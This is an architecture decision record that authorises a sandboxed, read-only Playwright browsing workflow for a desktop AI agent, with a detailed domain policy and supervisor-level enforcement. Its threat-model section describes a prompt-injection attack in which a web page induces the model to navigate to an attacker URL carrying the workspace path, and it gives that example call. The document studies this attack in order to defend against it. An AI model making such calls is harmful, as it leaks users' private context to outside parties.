---
schema-version: 1
status: accepted
owner: software-engineer
last-verified: 2026-09-03
source: repository evidence, user decisions 2026-09-03
---

# 0003 — Playwright browser automation: the first workflow

## Status

**Gate open, 2026-09-03.** Recorded twice before as blocked. The three unmet
requirements were re-verified against current source and then resolved by user
decision the same day. Implementation of one read-only workflow is authorised.

## Gate history

| Date | Verdict | Controlling reason |
| --- | --- | --- |
| 2026-09-02 | Blocked | Per-call approval unshipped, isolation unshipped, product decisions unspecified |
| 2026-09-03 (early) | Blocked | Approval shipped (0008) but the Engine did not enforce it; isolation still absent |
| 2026-09-03 (late) | **Open** | Approval enforced; isolation prerequisite scoped to the browser; product decisions supplied |

## The gate

`.github/prompts/implement-browser-automation.prompt.md`:

> Require shipped per-call approval and isolated execution. Require the user to
> name the first workflow, target environment, permitted domains, required
> private data, and allowed outbound actions. If any is unspecified, stop and ask
> for those decisions before writing code.

## Gate re-verification, 2026-09-03

Measured, not inherited.

- **Per-call approval — enforced.** `Test-DpApprovalActive`,
  `Invoke-DpTerminalApprovalTool` and the `run_terminal_command` registration
  ship, and `Initialize-DpTerminalTool` probes `Invoke-Shp` for the
  `offeredBuiltInTool` refusal and throws without it. The refusal exists in the
  staged `output/RequiredModules/ShellPilot/0.4.1` and not in the installed
  `0.4.0`; `RequiredModules.psd1` pins `'latest'`, so the probe fails closed
  elsewhere. `perCallApproval` still defaults `$false`.
- **Isolation — absent for Tool execution, present for the browser.** `source/`
  holds no confinement code; every `container`/`sandbox` match is
  `Test-Path -PathType Container`, the MCP `sandboxRequested` badge, or the
  diagnostics "isolated PowerShell instance".
- **Playwright — absent.** No dependency anywhere. Browsing is the Engine's
  `fetch_url`, reached through `DisableBrowsing` in `New-DpTurnParameter`.

## The isolation prerequisite, scoped

The prompt requires "shipped isolated execution". Decision 0001's isolation is
**container confinement for terminal commands**, blocked on an unapproved
Docker/WSL2 dependency and a machine with no container runtime.

**Decided: that is not this feature's prerequisite.** Browser automation carries
its own boundary — a separate supervised process and a disposable profile with no
personal cookies, extensions, password store, history, downloads, or ambient SSO.
It needs no Docker, and it is what makes "Stop kills the whole tree"
implementable. Terminal isolation remains blocked under 0001 and is unaffected.

This scoping is deliberate and narrow. It authorises a browser-only Tool surface.
It does not authorise general desktop control, and it is not a precedent for
calling process separation "isolation" for terminal commands — decision 0001
rejects exactly that, and still does.

## The first workflow

**Read the weather for Osorno, Chile, from `weathercity.com`.**

Verified reachable 2026-09-03: `https://weathercity.com/` →
`https://weathercity.com/cl/` → `https://weathercity.com/cl/ll/osorno`. Three
same-origin navigations, `https` only.

| Gate input | Decision |
| --- | --- |
| Workflow | Navigate to a country, then a city, then read the rendered forecast |
| Target environment | A public read-only site. No test-portal credentials exist, and none are needed |
| Permitted domains | `weathercity.com` and subdomains, plus any per-Project additions, plus per-run grants |
| Required private data | **None.** "Chile" and "Osorno" are task parameters in the Tool call, not private values. No credential, Workspace Folder, clipboard, or home directory is reachable |
| Allowed outbound actions | **None.** Navigate, click a link, read text, screenshot. No submission, upload, download, message, purchase, or deletion |

## Current baseline, verified

DeskPilot's browser capability is the static SPA plus the Engine's `fetch_url`
Tool. It can retrieve and read a URL; it cannot inspect a live DOM, click a
control, fill a field, or drive a browser. No Playwright dependency is declared
in `RequiredModules.psd1` or anywhere else.

## Trifecta assessment for this workflow

The prompt requires breaking at least one leg by architecture. Two are broken
outright, and the third is the one that needed designing.

- **Agency — broken.** The Tool surface contains no action with an external
  effect. There is nothing to submit, so an injected page cannot cause one.
- **Private data, browser side — broken.** No credential or local path is
  reachable from the browser context.
- **Egress — the real exposure, and not obvious.** The browser holds no secrets,
  but the **Model's context does**: the conversation, the Workspace Folder path,
  prior Turn content. The Model also chooses the next URL. An injected page that
  induces `browser_navigate("https://attacker/?ctx=<workspace path>")` exfiltrates
  through the URL itself, with no file read and no command run. This is why an
  open domain policy was rejected.

## Domain policy: scope-plus-prompt

Rejected: an open allow-list. The user's objection — nobody can enumerate in
advance what a site will need — is correct, and is answered by deriving scope
per run rather than by widening it.

| Class | Policy | Reason |
| --- | --- | --- |
| Top-level navigation, in scope | Allowed | Scope is the starting URL's registered domain and subdomains, `https` only |
| Top-level navigation, out of scope | Approval card naming the full URL; granted for that run only | The user decides when it actually arises, with the payload visible |
| Redirect landing off-scope | Treated as navigation | A redirect is a navigation the page chose |
| Off-origin image, stylesheet, font | Allowed | The page controls these and the page knows no secrets. Blocking them breaks ordinary sites for no gain |
| Off-origin script | Blocked | Rewrites the page after a screenshot was approved, so "what you saw is what happened" stops holding, and it makes injection dynamic |
| Off-origin WebSocket, XHR, fetch, beacon | Blocked | A channel that outlives the Tool call and never appears in the navigation record, voiding the Activity trail |
| Download, any origin | Blocked | A local write, needing its own approval; out of scope for a read-only slice |
| Anything page content proposes adding | Never | Only the user widens scope |

The asymmetry that makes this coherent: **off-origin images are safe for the same
reason off-origin navigation is not — the page does not know the Model's context,
and the Model does.**

**Per-Project additions widen only from Settings.** A Project may carry a
`browserDomains` list, validated on merge, a bad entry throwing rather than being
silently dropped or silently accepted. The approval card grants for the run only
and offers no "always allow" button. This reuses decision 0008's `safeCommands`
reasoning verbatim: "always allow this" beside a prompt is the button a tired
operator presses.

## Enforcement lives below the Model

Policy is evaluated in the Node supervisor via `context.route('**/*')`,
`request.isNavigationRequest()` and `request.resourceType()`, with
`context.on('page')` closing pop-ups and `page.on('download')` cancelling
downloads. The Model's only interface is four typed Tool calls, so it cannot read
the allow-list, widen it, or switch it off. Page content reaches the Model as
data and reaches the supervisor as nothing at all.

A policy expressed in the system prompt would be a request. This one is a
boundary.

## Runtime decisions

Carried forward from the blocked record; unchanged and now in force.

**Binding and runtime.** Official `playwright` Node package, driven from
PowerShell over a supervised child process. Rationale: the .NET binding would
put browser control inside the Host Server process, and the Engine Runspace is
already the single-threaded resource everything else queues behind. A separate
process is also what makes "Stop kills the whole tree" implementable.

**Node.js ownership.** DeskPilot does **not** bundle Node. It detects a
supported Node, reports its absence in Diagnostics, and offers a consent-gated
install pointing at the official distribution. Silently downloading an
executable runtime is exactly what the security model forbids.

**Browser binaries.** Pinned Playwright version with its matching browser build,
installed only on explicit consent into the DeskPilot data directory, verified by
Playwright's own version check before a Turn starts. Offline start with a
missing or mismatched binary fails visibly; it never falls back to a locally
installed browser, because that browser's profile is the user's.

**Profile.** A dedicated disposable profile per run: no personal cookies,
extensions, password store, history, downloads, or ambient SSO. Visible, not
headless, for the first user-facing workflow.

**Permission.** A separate `browserAutomation` Permission, off by default.
Browsing Permission must not imply it.

## Non-goals

Desktop, keyboard, mouse or screen control; reuse of the user's everyday browser
profile; driving an arbitrary locally installed browser; CAPTCHA bypass or
unattended credential entry; arbitrary-domain browsing with private data access;
a generic record-and-replay system before one workflow is proven.

